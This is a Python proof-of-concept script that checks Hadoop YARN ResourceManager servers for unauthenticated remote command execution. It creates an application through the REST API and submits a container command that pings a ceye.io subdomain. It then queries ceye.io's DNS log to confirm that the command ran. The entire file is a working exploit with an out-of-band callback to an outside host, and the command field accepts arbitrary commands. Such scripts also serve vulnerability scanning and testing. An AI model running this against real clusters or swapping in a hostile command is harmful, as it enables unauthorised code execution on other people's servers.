# coding:utf-8
import random
import time
import requests as req
def verify(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
    }
    target=target.rstrip("/")
    action1 = "/ws/v1/cluster/apps/new-application"
    resp1 = req.post(target + action1, headers=headers, timeout=30, verify=False, allow_redirects=False)
    app_id=0
    try:
        app_id = resp1.json()['application-id']
    except Exception as e:
        print (e)
        return False
    action2="/ws/v1/cluster/apps"
    ceye_domain="{}.xxxxx.ceye.io".format(''.join(random.sample('abcdefghijklmnopqrstuvwxyz',5)))
    ceye_api_token = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
    data = {
        'application-id': app_id,
        'application-name': 'test',
        'am-container-spec': {
            'commands': {
                'command': 'ping -c 1 %s' % ceye_domain
            },
        },
        'application-type': 'YARN',
    }
    req.post(target+action2, json=data, headers=headers, timeout=30, verify=False, allow_redirects=False)
    time.sleep(3)
    ret=req.get("http://api.ceye.io/v1/records?token={}&type=dns&filter={}".format(ceye_api_token,ceye_domain)).json()["data"]
    if ret:
        print (target + "，存在漏洞")
        return True
    return False
if __name__ == '__main__':
    verify("http://lpone/")